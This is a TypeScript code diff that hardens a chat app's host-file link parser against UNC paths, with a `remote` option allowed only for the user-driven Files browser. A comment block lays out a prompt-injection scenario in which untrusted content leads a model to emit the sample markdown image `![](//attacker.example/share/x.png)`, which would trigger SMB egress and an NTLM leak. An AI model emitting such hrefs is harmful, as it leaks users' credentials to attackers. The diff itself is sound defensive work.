@@ -14,6 +14,10 @@ import { instanceBase } from "./instance-origin"
 // user's own client over `/api/fs/read`, which the Files app already uses to browse any absolute
 // path. Nothing egresses, and an agent embedding a path it should not have named renders a broken
 // image on the user's screen rather than sending anything anywhere.
+//
+// ⚠️ That last sentence is a CLAIM the parser has to earn, and there was exactly one input for which
+// it was false: a path rooted on another machine (`//host/share/…`) is a network destination, not a
+// local file, and the chat renders an image href with no click. See `isRemote` below.
 
 /** Extensions the chat renders INLINE rather than offering as a download. */
 const IMAGE = new Set(["png", "jpg", "jpeg", "gif", "webp", "svg", "bmp", "avif", "ico"])
@@ -39,8 +43,37 @@ const slashes = (raw: string): string => raw.split(SEPARATOR).join("/")
 
 const SEPARATOR = String.fromCharCode(92)
 
-/** A path rooted on a drive (`C:/…`), on `/`, or a UNC share (`//host/share`). */
+/** A path rooted on a drive (`C:/…`) or on `/`. A UNC share is `//host/share` — see {@link isRemote}. */
 const isAbsolute = (raw: string): boolean => /^[a-zA-Z]:\//.test(raw) || raw.startsWith("/")
+
+/**
+ * A path whose ROOT is another machine: `//host/share/…` after normalisation, in any of the spellings
+ * that reach it (`\\host\share`, `//host/share`, `file://///host/share`).
+ *
+ * 🔴 **This is a NETWORK DESTINATION wearing a path's clothes, and the chat log is where an attacker
+ * gets to choose one.** Everything a peer or a fetched page says is untrusted content that reaches a
+ * model (AGENTS.md — *the community is a network of agents*), and a colleague quoting it back is one
+ * markdown image away from `![](//attacker.example/share/x.png)`. That href needs no click: the chat
+ * renders it INLINE, the browser asks the instance for it, and the instance — which is the machine
+ * with the user's files and credentials on it — opens an SMB connection to a host named by the
+ * attacker. On Windows that hands over an NTLM exchange before anything has decided whether the file
+ * exists, and it is egress the user never asked for (principle 4: the data plane does not leave).
+ *
+ * The whole point of this module is that a host file link "renders a broken image rather than
+ * sending anything anywhere", and a remote root is the one input for which that sentence was false.
+ */
+const isRemote = (normalised: string): boolean => normalised.startsWith("//")
+
+export interface HostFileOptions {
+  /**
+   * Allow a path rooted on another machine. **Default `false`, and the default is the security
+   * property** — the caller that may say `true` is the one where the USER chose the path (the Files
+   * browser, which can legitimately be sitting on a mapped share), never one where a model or a
+   * document did. Making the safe answer the one you get by not thinking about it is the difference
+   * between a guard and a convention.
+   */
+  readonly remote?: boolean
+}
 
 /**
  * Is this markdown href a file on the host, and what should it render as?
@@ -50,7 +83,7 @@ const isAbsolute = (raw: string): boolean => /^[a-zA-Z]:\//.test(raw) || raw.sta
  * file would break a working one. `http(s)`, `mailto`, in-page anchors and relative paths are all
  * left to the existing renderer.
  */
-export const hostFile = (href: string | undefined): HostFile | undefined => {
+export const hostFile = (href: string | undefined, options: HostFileOptions = {}): HostFile | undefined => {
   const raw = (href ?? "").trim()
   if (raw === "") return undefined
   if (/^(?!file:)[a-z][a-z0-9+.-]*:\/\//i.test(raw)) return undefined
@@ -65,6 +98,7 @@ export const hostFile = (href: string | undefined): HostFile | undefined => {
   }
   const normalised = slashes(stripped)
   if (!isAbsolute(normalised)) return undefined
+  if (isRemote(normalised) && options.remote !== true) return undefined
   // ⚠️ A query or fragment is not part of a path. A model that writes `chart.svg#legend` means the
   // file, and passing the fragment through would ask the server for a name that does not exist.
   const clean = (normalised.split(/[?#]/)[0] ?? "").replace(/\/+$/, "")
@@ -115,6 +149,10 @@ export const resolveAgentFile = (href: string): { readonly url: string; readonly
  * surfaces, and a second path-splitter would drift from this one the first time either changed.
  */
 export const fileDownloadHref = (absolute: string): string => {
-  const file = hostFile(absolute)
+  // ⚠️ `remote: true` here and NOWHERE ELSE. This path is reached from a row the user navigated to in
+  // the Files browser, so the share was already opened by their own choice and refusing it would take
+  // a working download away from anyone whose workspace lives on one. The chat's resolver above keeps
+  // the default, because there the path is a string a model wrote.
+  const file = hostFile(absolute, { remote: true })
   return file === undefined ? "" : fileUrl(instanceBase(), file)
 }
